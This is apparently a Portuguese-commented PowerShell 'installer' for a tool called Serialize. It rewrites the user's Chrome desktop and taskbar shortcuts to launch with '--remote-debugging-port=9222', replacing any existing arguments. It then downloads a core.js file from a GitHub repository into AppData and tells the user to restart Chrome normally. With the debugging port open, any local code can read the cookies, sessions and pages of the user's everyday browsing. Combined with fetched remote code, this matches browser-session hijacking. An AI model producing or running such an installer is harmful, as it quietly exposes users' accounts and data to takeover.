# Serialize Installer - Version 0.2
$installPath = "$env:APPDATA\Serialize"
if (!(Test-Path $installPath)) { New-Item -Path $installPath -ItemType Directory }

Write-Host "--- Iniciando Instalação do Serialize ---" -ForegroundColor Cyan

# 0. Garante que o Chrome está fechado (Opcional, mas recomendado)
# Stop-Process -Name "chrome" -ErrorAction SilentlyContinue

# 1. Função para injetar flag em atalhos (.lnk)
function Inject-Serialize-Flag {
    param([string]$folderPath)
    $shell = New-Object -ComObject WScript.Shell
    $shortcuts = Get-ChildItem -Path $folderPath -Filter "*Chrome*.lnk"
    
    foreach ($lnk in $shortcuts) {
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        if ($shortcut.TargetPath -like "*chrome.exe*") {
            $shortcut.Arguments = "--remote-debugging-port=9222"
            $shortcut.Save()
            Write-Host "Flag injetada em: $($lnk.Name)" -ForegroundColor Green
        }
    }
}

# 2. Varre Desktop e Barra de Tarefas
$desktop = [System.Environment]::GetFolderPath('Desktop')
$taskbar = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"

Inject-Serialize-Flag $desktop
Inject-Serialize-Flag $taskbar

# 3. Baixa o 'core.js' do seu repositório
Write-Host "Baixando componentes do Serialize..." -ForegroundColor Yellow
$coreUrl = "https://raw.githubusercontent.com/denishark333/serialize.10/main/core.js"
Invoke-WebRequest -Uri $coreUrl -OutFile "$installPath\core.js"

Write-Host "--- Serialize instalado com sucesso! ---" -ForegroundColor Cyan
Write-Host "Reinicie o Chrome usando seus atalhos normais."
